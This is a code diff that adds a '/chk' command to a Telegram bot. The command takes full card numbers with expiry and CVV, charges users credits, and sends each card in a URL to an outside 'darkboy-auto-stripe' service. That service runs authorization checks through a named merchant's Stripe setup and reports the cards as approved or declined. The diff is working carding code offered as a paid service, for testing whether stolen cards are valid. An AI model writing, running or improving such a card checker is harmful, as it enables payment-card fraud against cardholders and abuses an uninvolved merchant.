@@ -648,6 +648,139 @@ async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+import aiohttp
+import time
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+
+async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Beast /chk: processing box -> BIN lookup + Darkboy API -> edit to final box.
+       Blocks private usage unless authorized, shows subscription message if blocked.
+    """
+    # Block private usage unless authorized
+    if update.effective_chat.type == "private":
+        if not await check_authorization(update, context):
+            return await update.effective_message.reply_text(
+                "❌ Private access is blocked.\n"
+                "Contact @YourOwnerUsername to buy subscription.",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+
+    user = update.effective_user
+    user_id = user.id
+
+    # Enforce cooldown
+    if not await enforce_cooldown(user_id, update):
+        return
+
+    # Load user data
+    user_data = await get_user(user_id)
+    if user_data.get('credits', 0) <= 0:
+        return await update.effective_message.reply_text(
+            "❌ You have no credits left.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Parse card input
+    raw = None
+    if context.args:
+        raw = context.args[0]
+    elif update.effective_message and update.effective_message.text:
+        parts = update.effective_message.text.split(maxsplit=1)
+        raw = parts[1] if len(parts) > 1 else None
+
+    if not raw or "|" not in raw:
+        return await update.effective_message.reply_text(
+            "Usage: /chk number|mm|yy|cvv",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    parts = raw.split("|")
+    if len(parts) != 4:
+        return await update.effective_message.reply_text(
+            "Invalid format. Use number|mm|yy|cvv (or yyyy for year).",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Normalize year to 2 digits
+    if len(parts[2]) == 4:
+        parts[2] = parts[2][-2:]
+    cc_normalized = "|".join(parts)
+
+    # BIN lookup
+    bin_number = parts[0][:6]
+    bin_details = await get_bin_details(bin_number)
+    brand = (bin_details.get("scheme") or "N/A").upper()
+    issuer = (bin_details.get("type") or "N/A").upper()
+    country_name = (bin_details.get("country_name") or "N/A").upper()
+
+    # Deduct credit
+    if not await consume_credit(user_id):
+        return await update.effective_message.reply_text(
+            "❌ No credits left.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Processing box
+    processing_text = (
+        "╔═══[ PROCESSING ]═══╗\n"
+        f"• Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
+        "• Gateway ➜ Stripe Auth\n"
+        "• Status ➜ Checking...\n"
+        "╚═════════════════════╝"
+    )
+    processing_msg = await update.effective_message.reply_text(
+        processing_text,
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+    start_time = time.time()
+
+    # Darkboy API call
+    api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=25) as resp:
+                if resp.status != 200:
+                    raise Exception(f"HTTP {resp.status}")
+                data = await resp.json()
+    except Exception as e:
+        return await processing_msg.edit_text(
+            f"❌ API Error: `{escape_markdown_v2(str(e))}`",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    api_status = (data.get("status") or "Unknown").title()
+    api_response = data.get("response") or "N/A"
+    time_taken = round(time.time() - start_time, 2)
+
+    if api_status.lower() == "approved":
+        header = "╔════[ APPROVED ✅ ]════╗"
+    elif api_status.lower() == "declined":
+        header = "╔════[ DECLINED ❌ ]════╗"
+    else:
+        header = f"╔════[ {escape_markdown_v2(api_status)} ]════╗"
+
+    final_text = (
+        f"{header}\n"
+        f"• Card       ➜ `{escape_markdown_v2(cc_normalized)}`\n"
+        f"• Gateway    ➜ Stripe Auth\n"
+        f"• Response   ➜ {escape_markdown_v2(api_response)}\n"
+        f"════════════════════════\n"
+        f"• Brand      ➜ {escape_markdown_v2(brand)}\n"
+        f"• Issuer     ➜ {escape_markdown_v2(issuer)}\n"
+        f"• Country    ➜ {escape_markdown_v2(country_name)}\n"
+        f"════════════════════════\n"
+        f"• Request By ➜ {escape_markdown_v2(user.first_name)}[{escape_markdown_v2(user_data.get('plan','Free'))}]\n"
+        f"• Developer  ➜ Darkboy X7\n"
+        f"• Time       ➜ {time_taken} seconds\n"
+        f"╚════════════════════════╝"
+    )
+
+    await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
+
+
 
 
 def escape_markdown_v2(text: str) -> str:
@@ -1405,6 +1538,7 @@ def main():
     application.add_handler(CommandHandler("credits", credits_command))
     application.add_handler(CommandHandler("gen", gen))
     application.add_handler(CommandHandler("bin", bin_lookup))
+    application.add_handler(CommandHandler("chk", chk_command))
     application.add_handler(CommandHandler("fk", fk_command))
     application.add_handler(CommandHandler("fl", fl_command))
     application.add_handler(CommandHandler("status", status_command))
